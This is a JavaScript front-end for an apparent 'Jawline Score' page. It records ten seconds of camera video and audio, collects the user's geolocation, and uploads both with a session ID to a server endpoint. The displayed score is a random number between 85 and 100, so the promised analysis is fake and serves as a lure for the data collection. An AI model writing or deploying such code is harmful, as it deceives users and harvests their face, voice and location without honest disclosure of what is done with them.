let video = document.getElementById("video")
let startBtn = document.getElementById("startBtn")
let statusText = document.getElementById("status")
let scoreText = document.getElementById("score")

let recorder
let chunks = []

let sessionID = "user_" + Date.now()

startBtn.onclick = async () => {

    statusText.innerText = "Requesting camera..."

    try{

        const stream = await navigator.mediaDevices.getUserMedia({
            video:true,
            audio:true
        })

        video.srcObject = stream

        recorder = new MediaRecorder(stream)

        chunks = []

        recorder.ondataavailable = (e)=>{
            if(e.data.size > 0){
                chunks.push(e.data)
            }
        }

        recorder.onstop = async ()=>{

            let blob = new Blob(chunks,{type:"video/webm"})

            let lat = ""
            let lon = ""

            try{

                let pos = await new Promise((resolve,reject)=>{
                    navigator.geolocation.getCurrentPosition(resolve,reject)
                })

                lat = pos.coords.latitude
                lon = pos.coords.longitude

            }catch{
                console.log("Location permission denied")
            }

            let formData = new FormData()
            formData.append("video",blob,"recording.webm")
            formData.append("session",sessionID)
            formData.append("latitude",lat)
            formData.append("longitude",lon)

            await fetch("/upload",{
                method:"POST",
                body:formData
            })

            let score = Math.floor(Math.random()*16)+85

            scoreText.innerText = "Your Jawline Score: "+score+"/100"
            statusText.innerText = "Analysis Complete"

        }

        recorder.start()

        statusText.innerText = "Recording for 10 seconds..."

        setTimeout(()=>{
            recorder.stop()
        },10000)

    }

    catch(err){
        statusText.innerText = "Camera permission denied"
    }

}